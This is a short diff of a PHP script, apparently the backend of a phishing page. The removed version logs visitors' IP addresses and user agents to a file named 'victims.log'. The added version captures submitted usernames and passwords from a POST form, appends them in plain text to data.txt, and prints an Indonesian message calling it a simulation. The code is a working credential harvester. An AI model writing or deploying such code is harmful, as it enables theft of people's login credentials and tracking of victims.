@@ -1,6 +1,10 @@
 
 <?php
-$data = json_decode(file_get_contents("php://input"), true);
-$log = "IP: " . $data['ip'] . " | UA: " . $data['userAgent'] . " | Time: " . $data['time'] . "\n";
-file_put_contents("victims.log", $log, FILE_APPEND);
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  $user = $_POST["username"];
+  $pass = $_POST["password"];
+  $data = "Username: $user | Password: $pass\n";
+  file_put_contents("data.txt", $data, FILE_APPEND);
+}
+echo "Data berhasil disimpan (simulasi).";
 ?>
